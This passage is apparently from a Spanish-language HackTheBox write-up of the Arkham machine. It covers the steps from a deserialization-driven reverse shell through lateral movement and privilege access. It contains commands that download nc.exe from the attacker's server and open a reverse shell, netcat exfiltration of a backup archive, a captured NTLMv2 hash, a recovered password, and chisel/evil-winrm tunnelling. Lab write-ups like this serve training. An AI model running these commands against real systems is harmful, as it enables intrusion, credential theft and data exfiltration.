10.10.10.130 - - [26/Apr/2021 25:25:25] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.130 - - [26/Apr/2021 25:25:25] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.130 - - [26/Apr/2021 25:25:25] "GET /nc.exe HTTP/1.1" 200 -
```

Pero al generar la reverse shell:

```py
...
sign_payload("C:\\Windows\\Temp\\nc.exe 10.10.14.14 4433 -e cmd.exe")
```

No pasa nada :( Asi que probablemente la ruta en la que estemos subiendo el archivo no exista. A jugar y probar cositas...

* [Where Does Windows Store Temporary Files and How to Change TEMP Folder Location?](https://www.askvg.com/where-does-windows-store-temporary-files-and-how-to-change-temp-folder-location/?__cf_chl_jschl_tk__=812d45995163fa039197bffdf31c5b8cabe0f062-1619536286-0-AZd7w3DpGArvac7iIIctQoNmgNStxtK3jib0xeNtJ6b1JGaz2Jnhie4KmOTNrRN6e_IIZR0GluumpmtlDom5VkSnLETLoFHBkaXh-yy6c3DlXFxs_6eqzoSl6KPdu9y8LCUqSPl4A9x5uuTr-A_VLZwfxNuQyG6QAfFs7NtbszztbvodTIThfqrWg7BI0tFh0HK_oTufa-j81Qm9_zJCg_M7reh2IV-7ECaWBIDIUtFF09b8iGpPlIq_1eTgqqKZKTqnGWGBpJyarfDmulFcJeM2UXMb5vHEcN-tb4Wjudun2nogOjqL1zXs4mZ3C2WGLtspWVafZBjzI7rC-xtrntGdG6ZzLYWykBhC1mf6aXLTE-m6ThY0sDsNyeB9FgI_RocT8d5wKXye1_nqIpAutHweTe83R2e4-XoOkBQ6yidlmzJAvapgnFOAhQKJiZLO_L4eYzqZkEfJcWqNBW6K0svtyiic-TsB6l4Ac0MVI7uRGz2aVOJABggxJeZ1sHZnWg).

Siguiendo la guía citada, vemos que la ruta anterior también puede encontrarse como `TEMP/`, así que probemos:

```py
...
sign_payload("curl http://10.10.14.14:8000/nc.exe -o C:\\Windows\\TEMP\\nc.exe'")
sign_payload("C:\\Windows\\TEMP\\nc.exe 10.10.14.14 4433 -e cmd.exe")
```

Recibimos petición y en nuestro listeneeeeeer:

![179bash_alfred_revSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_alfred_revSH.png)

Listooooones, a darleeeeeeeeeeeeeeeeee!!

...

## Movimiento lateral : Alfred -> Batman [#](#movimiento-lateral-alfred-batman) {#movimiento-lateral-alfred-batman}

Enumerando un poco sobre el directorio `C:\Users` vemos:

```powershell
c:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is FA90-3873

 Directory of c:\Users

02/03/2019  06:54 PM    <DIR>          .
02/03/2019  06:54 PM    <DIR>          ..
02/03/2019  09:26 AM    <DIR>          Administrator
02/03/2019  06:31 PM    <DIR>          Alfred
02/02/2019  10:48 AM    <DIR>          Batman
02/03/2019  06:54 PM    <DIR>          Guest
02/01/2019  08:19 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)   8,718,667,776 bytes free

c:\Users>
```

Profundizando en el directorio `C:\Users\Alfred` encontramos un archivo `.zip`:

```powershell
c:\Users\Alfred\Downloads\backups>dir
 Volume in drive C has no label.
 Volume Serial Number is FA90-3873

 Directory of c:\Users\Alfred\Downloads\backups

04/27/2021  10:24 PM    <DIR>          .
04/27/2021  10:24 PM    <DIR>          ..
02/03/2019  08:41 AM           124,257 backup.zip
               1 File(s)        124,257 bytes
               2 Dir(s)   8,722,964,480 bytes free

c:\Users\Alfred\Downloads\backups>
```

Movámoslo a nuestra máquina, probando mediante una carpeta compartida con **SMB**:

```bash
❭ smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Obtenemos:

```powershell
c:\Users\Alfred\Downloads\backups>copy backup.zip \\10.10.14.14\smbFolder\backup.zip
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
        0 file(s) copied.

c:\Users\Alfred\Downloads\backups>
```

Y en el servidor **SMB** recibimos el hash [Net-NTLMv2](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) del usuario **Alfred**, pero intentando crackearlo no logramos nada :(

```bash
...
[*] Incoming connection (10.10.10.130,49707)
[*] AUTHENTICATE_MESSAGE (ARKHAM\Alfred,ARKHAM)
[*] User ARKHAM\Alfred authenticated successfully
[*] Alfred::ARKHAM:aaaaaaaa:7788c08b972d046d3204856b5e605c9c:010100000000000080a2169c763ad701bdc49d05e3f6764400000000010010007a0072006e00520070007200720041000200100062007a0069004c0049004d004e004f00030010007a0072006e00520070007200720041000400100062007a0069004c0049004d004e004f000700080080a2169c763ad70106000400020000000800300030000000000000000000000000200000501679800e3ec4fec38e468143ba78a69d3112f8176260dbae0bf0d0fce82c1d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000
[*] Closing down connection (10.10.10.130,49707)
...
```

Después recordamos una manera mediante **netcat**, aprovechando que ya lo subimos podemos ejecutar el proceso.

Nos ponemos en escucha y guardamos el output en un archivo llamado `backup.zip`:

```bash
❭ nc -lvp 4434 > backup.zip
listening on [any] 4434 ...
```

Y en la máquina Windows indicamos que lea el contenido del archivo `backup.zip`, espere 5 segundos como máximo y envíe el resultado a nuestro listener:

```powershell
c:\Users\Alfred\Downloads\backups>C:\\Windows\\TEMP\\nc.exe -w 5 10.10.14.14 4434 < backup.zip
```

Recibimos:

```bash
❭ nc -lvp 4434 > backup.zip
listening on [any] 4434 ...
10.10.10.130: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.130] 49743
```

Y validando:

```bash
❭ ls 
backup.zip
```

Bien, veamos que contiene:

```bash
❭ unzip backup.zip
Archive:  backup.zip
  inflating: alfred@arkham.local.ost
```

> Offline Outlook Data File (.ost) file is used to store a synchronized copy of your mailbox information on your local computer. [Offline Outlook Data File (.ost)](https://support.microsoft.com/en-us/office/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790).

Opa, entonces tenemos los directorios de un correo (en este caso de **alfred**) 😮

Bien pues buscando en internet encontramos la herramienta [readpst](https://linux.die.net/man/1/readpst) para convertir este tipo de archivos un formato distinto, por default a un archivo `.mbox`:

```bash
❭ readpst alfred@arkham.local.ost
Opening PST file and indexes...
Processing Folder "Deleted Items"
Processing Folder "Inbox"
Processing Folder "Outbox"
Processing Folder "Sent Items"
Processing Folder "Calendar"
Processing Folder "Contacts"
Processing Folder "Conversation Action Settings"
Processing Folder "Drafts"
Processing Folder "Journal"
Processing Folder "Junk E-Mail"
Processing Folder "Notes"
Processing Folder "Tasks"
Processing Folder "Sync Issues"
Processing Folder "RSS Feeds"
Processing Folder "Quick Step Settings"
        "alfred@arkham.local.ost" - 15 items done, 0 items skipped.
        "Calendar" - 0 items done, 3 items skipped.
Processing Folder "Conflicts"
Processing Folder "Local Failures"
Processing Folder "Server Failures"
        "Sync Issues" - 3 items done, 0 items skipped.
        "Drafts" - 1 items done, 0 items skipped.
        "Inbox" - 0 items done, 7 items skipped.
```

Si enfocamos la vista, vemos que simplemente recupero contenido de un "folder" llamado **Server Failures -> Drafts**, si validamos tenemos efectivamente un archivo llamado `Drafts.mbox`:

```bash
❭ ls
alfred@arkham.local.ost  backup.zip  Drafts.mbox
```

Leyendo el archivo normalmente, vemos varias cositas:

```bash
...
From "MAILER-DAEMON" Thu Jan 1 00:00:00 1970
From: <MAILER-DAEMON>
Subject: 
To: batman
...
```

![179bash_cat_draftsMbox](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_cat_draftsMbox.png)

Opa, vemos un mensaje hacia Wayne (Batman) para que deje de olvidarse de su contraseña y adjunto lleva una imagen en formato **Base64**. Entonces tomando el contenido encodeado y copiándolo a un archivo que llamaremos `base64.txt` para posteriormente decodearlo (`cat base64.txt | base64 -d > loquesea.png`) y guardar el output en uno llamado `loquesea.png` tendríamos finalmente:

![179bash_display_loqueseaPNG](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_display_loqueseaPNG.png)

OHHH, unas credenciales de un usuario llamado **batman**, si recordamos, antes vimos que entre los usuarios del sistema tenemos uno llamado **Batman**, así que copiémonos la contraseña:

```txt
Batman : Zx^#QZX+T!123
```

Validándola borrando un número y después completa tenemos:

```bash
❭ crackmapexec smb 10.10.10.130 -u Batman -p 'Zx^#QZX+T!12'
SMB         10.10.10.130    445    ARKHAM           [*] Windows 10.0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)
SMB         10.10.10.130    445    ARKHAM           [-] ARKHAM\Batman:Zx^#QZX+T!12 STATUS_LOGON_FAILURE
```

Y ahora bien:

```bash
❭ crackmapexec smb 10.10.10.130 -u Batman -p 'Zx^#QZX+T!123'
SMB         10.10.10.130    445    ARKHAM           [*] Windows 10.0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)
SMB         10.10.10.130    445    ARKHAM           [+] ARKHAM\Batman:Zx^#QZX+T!123
```

Perfecto, son válidas :) Pero validando con **psexec**, con **wmiexec** y con **crackmapexec** no logramos obtener una Shell como **Batman**.

Enumerando los servicios corriendo en la máquina internamente tenemos uno interesante, ¿lo ves?:

```powershell
c:\Users\Alfred\Videos>netstat -a
netstat -a

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             ARKHAM:0               LISTENING
  TCP    0.0.0.0:135            ARKHAM:0               LISTENING
  TCP    0.0.0.0:445            ARKHAM:0               LISTENING
  TCP    0.0.0.0:5985           ARKHAM:0               LISTENING
  TCP    0.0.0.0:8009           ARKHAM:0               LISTENING
  TCP    0.0.0.0:8080           ARKHAM:0               LISTENING
  TCP    0.0.0.0:47001          ARKHAM:0               LISTENING
  TCP    0.0.0.0:49664          ARKHAM:0               LISTENING
  TCP    0.0.0.0:49665          ARKHAM:0               LISTENING
  TCP    0.0.0.0:49666          ARKHAM:0               LISTENING
  TCP    0.0.0.0:49667          ARKHAM:0               LISTENING
  TCP    0.0.0.0:49668          ARKHAM:0               LISTENING
  TCP    0.0.0.0:49669          ARKHAM:0               LISTENING
...
```

Efectivamente, tenemos el puerto **5985** que generalmente sirve el servicio [WinRM](https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/) (Windows Remote Management) el cual entre muchas cosas brinda una interfaz de comandos para realizar tareas de administración en el sistema. Hay una utilidad conocida y muy linda llamada [evil-winrm](https://github.com/Hackplayers/evil-winrm) que explota el servicio para proveer una PowerShell completamente interactiva. Pero no podemos usarla así de la nada, ya que el puerto está sirviendo, pero internamente, entonces juguemos con [chisel](https://github.com/jpillora/chisel) para generar un **Remote Port Forwarding**, permitiendo así que el puerto **5985** de la máquina **10.10.10.130** (internamente **127.0.0.1**) se convierta en un puerto cualquiera de nuestra máquina atacante (**10.10.14.14**), entonces podremos acceder al puerto desde nuestro sistema y lograr ejecutar **evil-winrm**.

* [Explicación tipos de reenvios de puertos (port forwarding) mediante *SSH*. (Quedense con las definiciones :P)](https://www.zonasystem.com/2019/01/tunel-ssh-port-forwarding-local-remote-dynamic.html).

### Remote Port Forwarding

Subamos el binario [chisel](https://github.com/jpillora/chisel) a la máquina Windows:

* Descargamos el comprimido para Windows: [chisel_1.7.6_windows_amd64.gz](https://github.com/jpillora/chisel/releases/tag/v1.7.6).
* Descomprimimos y cambiamos nombre a uno más sencillo.exe :P
* Descargamos el comprimido para Linux: [chisel_1.7.6_linux_amd64.gz](https://github.com/jpillora/chisel/releases/tag/v1.7.6).
* Descomprimimos y cambiamos nombre a otro más sencillo :)
* Subimos el binario `.exe` a la máquina: `powershell IWR -uri http://10.10.14.14:8000/chisel.exe -OutFile chisel.exe`.
* Validamos que la version de los dos binarios sea la misma simplemente ejecutandolos: **Version: 1.7.6 (go1.16rc1)**.

Ahora, le indicamos a nuestra máquina atacante que levante el puerto **5988** (que sera el que reciba el Port Fortwarding) y actue como servidor (listener) mediante **chisel**:

```bash
❭ ./chisel server -p 5988 --reverse
2021/04/26 05:50:07 server: Reverse tunnelling enabled
2021/04/26 05:50:07 server: Fingerprint hZ7G/q+Y+FZ0cm+H0AlBa9rOHdjlYpb59JtMBGs13eQ=
2021/04/26 05:50:07 server: Listening on http://0.0.0.0:5988
```

Tamo, ahora vamos al cliente e indicamos que tome el puerto **5985** y reenvie su trafico al puerto **5988** de la máquina **10.10.14.14** que simula realmente el puerto **5985** del localhost:

```powershell
c:\Users\Alfred\Videos>chisel.exe client 10.10.14.14:5988 R:5985:localhost:5985
chisel.exe client 10.10.14.14:5988 R:5985:localhost:5985
2021/04/28 00:42:05 client: Connecting to ws://10.10.14.14:5988
2021/04/28 00:42:07 client: Connected (Latency 200.7885ms)
```

Recibimos en el servidor:

```bash
...
2021/04/26 25:25:25 server: session#1: tun: proxy#R:5985=>localhost:5985: Listening
```

Validando el contenido del puerto **5988** vemos:

```bash
❭ lsof -i:5988
COMMAND     PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
chisel  1050047 root    6u  IPv6 4641412      0t0  TCP *:5988 (LISTEN)
chisel  1050047 root    7u  IPv6 4642498      0t0  TCP 10.10.14.14:5988->10.10.10.130:49772 (ESTABLISHED)
❭ lsof -i:5985
COMMAND     PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
chisel  1050047 root    8u  IPv6 4642501      0t0  TCP *:5985 (LISTEN)
```

Bien, ahora probemos conectarnos mediante **evil-winrm** con las credenciales que tenemos:

* Toma por defecto el puerto **5985**, y pues como hay un redireccionamiento actual hacia ese puerto de nuestra máquina, no debemos indicarselo ;)

```bash
❭ evil-winrm -i localhost -u 'Batman' -p 'Zx^#QZX+T!123'
```

![179bash_evilwinrm_batmanSH_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_evilwinrm_batmanSH_done.png)

Perfecto, tenemos una **PowerShell** como el usuario **batman** en el sistema :O Sigamos jugando...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si vemos los grupos con los que cuenta **Batman**, tenemos que en teoria somos administradores:

```powershell
*Evil-WinRM* PS C:\Users> net user Batman
User name                    Batman
Full Name
Comment
User's comment
Country/region code          001 (United States)
Account active               Yes
Account expires              Never

Password last set            2/3/2019 9:25:50 AM
Password expires             Never
Password changeable          2/3/2019 9:25:50 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/27/2021 9:00:34 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.
```

Por lo que podriamos ver el contenido de la flag, pero no :( Además si vemos nuestros permisos claramente nos damos cuenta que no somos admins aun:

```powershell
*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Jugando un rato a ver por que metodo podriamos romper esto, recordamos algo.

En la imagen donde estaban las credenciales de **Batman** habia un comando para entrar a un recurso llamado **gotham**... Y si modificamos esa linea pero para ingresar al directorio `C:\` del sistema? Pues buscando info, llegamos a este recurso:

* [How to access C$ share in a network?](https://superuser.com/questions/328461/how-to-access-c-share-in-a-network#answer-328531).

Nos interesa el **cuarto** paso, que juntandolo con [este articulo](https://www.getfilecloud.com/supportdocs/display/cloud/How+to+Mount+CIFS+Shares+from+Windows+Command+Line) quedaria asi la linea:

```powershell
*Evil-WinRM* PS C:\Users> net use G: \\ARKHAM\C$
The command completed successfully.

*Evil-WinRM* PS C:\Users> cd G:\
*Evil-WinRM* PS G:\> 
```

Entonces, montamos el directorio `C:\` en un directorio compartido llamado `G:\` y nos permite ver las flags:

![179flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179flags.png)

Listones. Igual entiendo que debe existir otra manera para obtener una shell con todos los permisos, pero despues de un rato no encontre como hacerlo :( Intentaré ver como cambiar nuestros permisos a unos de full admin, pero mientras tanto subo todo el proceso para llegar hasta aqui, relativamente somos admins ;)

...

Ufff vaya máquina eh! Por momentos me parecia que estaba ante una máquina nivel **Hard**, pero fue interesante, todos los ataques de deserializacion me encantan, asi que disfute mucho esa parte :)

Y bueno, aaaaaaaaaaaaaaa calmarnos y a tomarnos un vasito de agua, pero sin dejar de pensar en romper todo! Nos vemos, gracias por leer.